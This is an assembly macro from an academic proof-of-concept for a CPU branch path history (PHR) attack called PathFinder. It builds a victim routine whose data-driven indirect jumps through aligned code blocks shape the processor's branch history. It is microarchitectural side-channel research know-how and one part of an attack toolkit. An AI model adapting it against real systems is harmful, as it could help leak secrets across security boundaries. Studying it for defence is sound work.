; # *****************************************
; # CONFIDENTIAL SOURCE CODE, DO NOT DISTRIBUTE!
; # IN SUBMISSION, ASPLOS 2024.
; # *****************************************
; #     Project:        PathFinder, PHR Attack Proof-of-Concept (PoC)
; #     Author:         Hosein Yavarzadeh
; #     Email:          hyavarzadeh@ucsd.edu
; #     Affiliation:    University of California, San Diego (UCSD)
; # *****************************************
%macro Victim_PHR_Model 0

    lea r8, [Victim_PHR0]
    lea r9, [Victim_PHR1]
    lea rcx, [Victim_PHR2]
    lea rdx, [Victim_PHR3]
    lea rsi, [Victim_End]
    mov qword [UserData+0], r8
    mov qword [UserData+16], r9
    mov qword [UserData+32], rcx
    mov qword [UserData+48], rdx
    mov qword [UserData+64], rsi

    lea r8, [UserData]
    lea r9, [UserData+600]

    movzx r11, byte[r9]
    shl r11, 4
    jmp qword [r11+r8]

    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    Victim_PHR0:
        %rep 50
         nop
        %endrep
        inc r9
        movzx r11, byte[r9]
        shl r11, 4
        jmp qword [r11+r8]

    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    Victim_PHR1:
        %rep 58
         nop
        %endrep
        inc r9
        movzx r11, byte[r9]
        shl r11, 4
        jmp qword [r11+r8]

    align 1<<16
    Victim_PHR2:
        %rep 2
         nop
        %endrep
        inc r9
        movzx r11, byte[r9]
        shl r11, 4
        jmp qword [r11+r8]

    align 1<<16
    Victim_PHR3:
        %rep 10
         nop
        %endrep
        inc r9
        movzx r11, byte[r9]
        shl r11, 4
        jmp qword [r11+r8]

    align 1<<16
    Victim_End:

%endmacro